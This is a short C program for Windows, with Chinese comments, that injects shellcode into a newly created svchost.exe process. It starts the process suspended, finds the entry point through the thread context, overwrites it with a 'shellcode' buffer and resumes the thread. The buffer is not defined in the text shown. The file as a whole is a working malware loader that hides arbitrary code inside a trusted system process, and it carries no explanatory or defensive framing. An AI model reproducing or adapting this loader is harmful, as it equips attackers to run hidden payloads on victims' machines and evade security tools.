int main(int argc, char* argv[])
{
	STARTUPINFO start = {0};
	PROCESS_INFORMATION ProcessInfo = {0};
	start.cb = sizeof(STARTUPINFO);

	memset(&ProcessInfo, 0, sizeof(PROCESS_INFORMATION));

	//创建挂起进程
	if (!CreateProcess(
		L"C:\\Windows\\System32\\svchost.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&start,
		&ProcessInfo
		))
	{
		printf("CreateProcess failed (%d).\n", GetLastError());
		return 0;
	}
	
	//获取线程上下文 拿到进程入口点地址
	CONTEXT context;
	context.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(ProcessInfo.hThread, &context))
	{
		printf("Get ThreadContext failed (%d).\n", GetLastError());
		TerminateProcess(ProcessInfo.hProcess,0);
		return 0;
	}

	//写入shellcode
	if (!WriteProcessMemory(ProcessInfo.hProcess, (LPVOID)context.Eax, shellcode, sizeof(shellcode), 0))
	{
		printf("Write Shellcode faild (%d). \n", GetLastError());
		TerminateProcess(ProcessInfo.hProcess, 0);
		return 0;
	}

	//恢复线程运行
	if (ResumeThread(ProcessInfo.hThread) == (DWORD)-1)
	{
		printf("ResumeThread failed (%d).\n",GetLastError());
		TerminateProcess(ProcessInfo.hProcess, 0);
		return 0;
	}

}

